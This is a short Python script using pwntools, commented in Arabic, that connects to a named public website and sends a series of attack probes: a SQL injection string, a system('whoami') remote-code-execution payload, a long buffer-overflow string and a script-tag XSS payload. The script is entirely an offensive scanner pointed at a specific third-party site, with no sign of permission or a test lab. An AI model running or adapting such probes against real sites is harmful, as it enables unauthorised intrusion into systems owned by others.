from pwn import *

# عنوان الموقع والمنفذ الذي تريد الاتصال به
target_ip = "pickyournewspaper.com"
target_port = 80

# الاتصال بالموقع
conn = remote(target_ip, target_port)

# إرسال طلب HTTP عادي (GET)
http_request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
conn.send(http_request)

# قراءة استجابة الموقع
response = conn.recv(1024)
print("Response from server:", response)

# اختبار SQL Injection
sql_injection_payload = "' OR '1'='1'; -- "
sql_request = f"GET /search?q={sql_injection_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
conn.send(sql_request)
sql_response = conn.recv(1024)
print("SQL Injection Response:", sql_response)

# اختبار RCE (Remote Code Execution)
rce_payload = "system('whoami');"  # أداة اختبار بسيطة مثل الحصول على اسم المستخدم
rce_request = f"GET /execute?cmd={rce_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
conn.send(rce_request)
rce_response = conn.recv(1024)
print("RCE Response:", rce_response)

# اختبار Buffer Overflow (نموذج بسيط)
buffer_overflow_payload = "A" * 1024  # محاولة إرسال بيانات كبيرة جداً لتجاوز الذاكرة
overflow_request = f"GET /vulnerable?input={buffer_overflow_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
conn.send(overflow_request)
overflow_response = conn.recv(1024)
print("Buffer Overflow Response:", overflow_response)

# اختبار XSS (Cross Site Scripting)
xss_payload = "<script>alert('XSS');</script>"  # اختبار بسيط لحقن JavaScript
xss_request = f"GET /search?q={xss_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
conn.send(xss_request)
xss_response = conn.recv(1024)
print("XSS Response:", xss_response)

# إغلاق الاتصال
conn.close()
